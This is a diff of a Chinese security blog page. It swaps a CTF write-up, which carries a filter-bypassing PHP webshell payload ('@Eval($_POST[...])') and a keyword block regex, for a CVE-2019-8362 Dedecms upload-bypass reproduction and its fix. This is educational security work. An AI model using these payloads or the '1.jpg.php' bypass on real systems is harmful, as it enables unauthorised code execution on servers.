@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTFHub 2021-第四届红帽杯网络安全大赛-Web-find_it, CTFer 网络安全 渗透测试">
+    <meta name="keywords" content="CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell, CTFer 网络安全 渗透测试">
     <meta name="description" content="本科 | 软件工程 | 网络安全">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CTFHub 2021-第四届红帽杯网络安全大赛-Web-find_it | 孤独星球</title>
+    <title>CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell | 孤独星球</title>
 
     <link rel="icon" type="image/jpeg" href="https://i.loli.net/2021/11/10/guPx1Olpo6HIYai.jpg">
 
@@ -452,7 +452,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CTFHub 2021-第四届红帽杯网络安全大赛-Web-find_it</h1>
+                    <h1 class="description center-align post-title">CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell</h1>
                 </div>
             </div>
         </div>
@@ -573,8 +573,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
-                                <span class="chip bg-color">做题记录</span>
+                            <a href="/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-8362/">
+                                <span class="chip bg-color">CVE漏洞复现,CVE-2019-8362</span>
                             </a>
                         
                     </div>
@@ -585,8 +585,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/wp/" class="post-category">
-                                wp
+                            <a href="/categories/CVE%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                CVE复现
                             </a>
                         
                     </div>
@@ -598,21 +598,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-11-11
+                    2021-11-14
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-11
+                    2021-11-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    418
+                    309
                 </div>
                 
 
@@ -637,74 +637,58 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="CTFHub-2021-第四届红帽杯网络安全大赛-Web-find-it"><a href="#CTFHub-2021-第四届红帽杯网络安全大赛-Web-find-it" class="headerlink" title="[CTFHub] 2021-第四届红帽杯网络安全大赛-Web-find_it"></a>[CTFHub] 2021-第四届红帽杯网络安全大赛-Web-find_it</h1><p>看群里说CTFHub上复现了， 我来看看</p>
-<p>本来想按照红帽杯的套路来试一下，发现phpinfo里莫得flag了</p>
-<p><img src="https://i.loli.net/2021/05/12/VefYUiBcQvhkTIo.png"></p>
-<p>只能想想其他办法咯</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+                <h1 id="CVE-2019-8362-Dedecms-v5-7-sp2-后台文件上传-getshell"><a href="#CVE-2019-8362-Dedecms-v5-7-sp2-后台文件上传-getshell" class="headerlink" title="CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell"></a>CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell</h1><h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><p>上传zip文件解压缩对于文件名过滤不周，导致getshell</p>
+<h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><p>Dedecms v5.7 sp2 </p>
+<h3 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h3><p>在<code>dede/album_add.php</code>的175行为上传文件后缀验证</p>
+<p><img src="https://i.loli.net/2021/11/14/pPKNArZE9svTfSO.png" alt="1"></p>
+<p>跟进<code>GetMatchFiles()</code>函数</p>
+<p><img src="https://i.loli.net/2021/11/14/J6oiR1c7jCvbTdx.png" alt="dqd.png"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GetMatchFiles</span><span class="token punctuation">(</span><span class="token variable">$indir</span><span class="token punctuation">,</span> <span class="token variable">$fileexp</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$filearr</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$dh</span> <span class="token operator">=</span> <span class="token function">dir</span><span class="token punctuation">(</span><span class="token variable">$indir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$dh</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$truefile</span> <span class="token operator">=</span> <span class="token variable">$indir</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"."</span> <span class="token operator">||</span> <span class="token variable">$filename</span> <span class="token operator">==</span> <span class="token double-quoted-string string">".."</span><span class="token punctuation">)</span>
+            <span class="token punctuation">{</span>
+                <span class="token keyword">continue</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$truefile</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token punctuation">{</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">GetMatchFiles</span><span class="token punctuation">(</span><span class="token variable">$truefile</span><span class="token punctuation">,</span> <span class="token variable">$fileexp</span><span class="token punctuation">,</span> <span class="token variable">$filearr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\.("</span><span class="token punctuation">.</span><span class="token variable">$fileexp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">")/i"</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token punctuation">{</span>
+                <span class="token variable">$filearr</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$truefile</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token variable">$dh</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<span class="token shell-comment comment">#Really easy...</span>
+<p>在这行验证中可以看到</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/.("</span><span class="token punctuation">.</span><span class="token variable">$fileexp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">")/i"</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<p>只是判断了文件名中是否存在<code>.jpg、.png、.gif</code>中的一个</p>
+<p>我们可以构造<code>1.jpg.php</code>来进行bypass</p>
+<h3 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h3><p>在本地存放一个php探针命名为<code>1.jpg.php</code>将其压缩为zip</p>
+<p>然后在后台的常用操作-文件式管理器处上传压缩文件到soft目录下</p>
+<p><img src="https://i.loli.net/2021/11/14/lrndTkzFwOZcafm.png" alt="firefox_53M4qOUQls.png"></p>
+<p>将<code>1.jpg.zip</code>上传到soft目录</p>
+<p>然后在<code>dede/album_add.php</code>中新建一个图集</p>
+<p><img src="https://i.loli.net/2021/11/14/fOWluxwagpH4vnE.png"></p>
+<p>上传成功后点击预览文档</p>
+<p><img src="https://i.loli.net/2021/11/14/INGW9qvmb72t1PC.png" alt="firefox_4PLbaUquVF.png"></p>
+<p>成功后点击预览中的超链接</p>
+<p><img src="https://i.loli.net/2021/11/14/y3hQ9DpaFribCtM.png" alt="firefox_j83QycVp7F"></p>
+<p><img src="https://i.loli.net/2021/11/14/y3hQ9DpaFribCtM.png"></p>
+<p>成功文件上传，如果将其换成webshell即可getshell</p>
+<h3 id="五、漏洞修复"><a href="#五、漏洞修复" class="headerlink" title="五、漏洞修复"></a>五、漏洞修复</h3><p>1、把/dede/file_class.php中的</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">else if(preg_match("/\.(".$fileexp.")/i",$filename))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<p>修改为：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$fileexp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token variable">$fileexp</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-
-<span class="token variable">$hack</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"hack.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you die"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><code>preg_match()</code>过滤了<code>eval</code>但是！！！！！</p>
-<p><code>Eval</code>它没ban</p>
-<p>所以我们可以写’大’马</p>
-<p>构造payload：</p>
-<pre class="line-numbers language-none"><code class="language-none">/?code=&lt;?php%20@Eval($_POST['aaa']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>蚁剑连马</p>
-<p>拿到flag：</p>
-<p><img src="https://i.loli.net/2021/05/12/D89pgxfsbSlhZTz.png"></p>
-<p>但是作为菜鸡</p>
-<p>我还是要重新思考一下这道题的思路：</p>
-<p>代码中有几个函数需要注意一下</p>
-<p>比如<code>fopen()</code>,<code>fwrite()</code>,<code>fread()</code></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">fread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 函数读取文件
-<span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>也就是说，这里已经读到了flag</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-这里又都写到了hack<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>所以也就是说，我们再绕通配符写马的时候，flag也被传进了hack.php中</p>
-<p>但是为什么看不到呢（具体我也不知道，知道的大哥哥可以告诉我学习一下）</p>
-<p>但是我想到了另外一个函数<code>show_source()</code></p>
-<pre class="line-numbers language-none"><code class="language-none">show_source() 函数对文件进行语法高亮显示。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>随机构造payload：</p>
-<pre class="line-numbers language-none"><code class="language-none">/?code=&lt;?php show_source(__FILE__);?&gt;
-也没有被ban的项，正常传入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>然后访问<code>hack.php</code></p>
-<p>flag他就出来了。。。。</p>
-<p>同时还有我传入的payload</p>
-<p><img src="https://i.loli.net/2021/05/12/rFVdyT7eBqtgnxb.png"></p>
-<p>搞一波骚操作！</p>
-<p><img src="https://i.loli.net/2021/05/12/Z3TzmtK8y4U6ehj.png"></p>
-<p>所以，今天又学到了新姿势~~~~</p>
+<p>2、及时更新版本</p>
 
                 
             </div>
@@ -731,7 +715,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://h3h3qaq.github.io/posts/ce4e97fc.html">https://h3h3qaq.github.io/posts/ce4e97fc.html</a>
+                    <a href="https://h3h3qaq.github.io/posts/f676a4bd.html">https://h3h3qaq.github.io/posts/f676a4bd.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -769,8 +753,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
-                                    <span class="chip bg-color">做题记录</span>
+                                <a href="/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-8362/">
+                                    <span class="chip bg-color">CVE漏洞复现,CVE-2019-8362</span>
                                 </a>
                             
                         </div>
@@ -940,17 +924,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/62244cdb.html">
+                <a href="/posts/f676a4bd.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928020616.jpg" class="responsive-img" alt="CTFSHOW命令执行">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928014727.jpg" class="responsive-img" alt="CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell">
                         
-                        <span class="card-title">CTFSHOW命令执行</span>
+                        <span class="card-title">CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -960,26 +945,27 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-11
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/wp/" class="post-category">
-                                    wp
+                            <a href="/categories/CVE%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    CVE复现
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
-                        <span class="chip bg-color">做题记录</span>
+                    <a href="/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-8362/">
+                        <span class="chip bg-color">CVE漏洞复现,CVE-2019-8362</span>
                     </a>
                     
                 </div>
@@ -993,13 +979,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/fa671b36.html">
+                <a href="/posts/62244cdb.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021245.jpg" class="responsive-img" alt="2021红帽杯 web writeup">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928020616.jpg" class="responsive-img" alt="CTFSHOW命令执行">
                         
-                        <span class="card-title">2021红帽杯 web writeup</span>
+                        <span class="card-title">CTFSHOW命令执行</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
